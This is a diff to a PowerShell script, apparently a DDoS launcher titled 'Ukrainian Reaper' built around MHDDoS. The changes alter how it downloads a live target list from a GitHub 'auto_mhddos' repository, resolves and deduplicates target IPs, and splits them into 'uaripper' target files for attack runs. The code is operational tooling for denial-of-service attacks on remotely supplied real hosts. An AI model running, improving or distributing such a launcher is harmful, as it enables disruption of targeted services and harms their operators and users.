@@ -19,11 +19,17 @@ Write-MidleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
 Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
 
 # get targets
+# select lines started with http or tcp only, split them by space
+# resolve ip addresses and remove duplicated (first unique persist)
+# If ip was not resolved asume as unique
+
 Write-MidleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
-$TargetsList = ( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
-    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
-    Foreach-Object {$_ -split " "} | Sort-Object -Unique
+$TargetsList = ( (( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
+    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
+    Foreach-Object {
+        [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ }
+} | Sort-Object -Property 'ip' -Unique ).address
 
 # create files with targets
 $TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
@@ -31,7 +37,6 @@ $NumberOfTargetsFiles = $TargetFiles.Length
 $NumberOfTargets = $TargetsList.Length
 
 # little math to calculate number of entries in one file
-
 $LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)
 
 for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
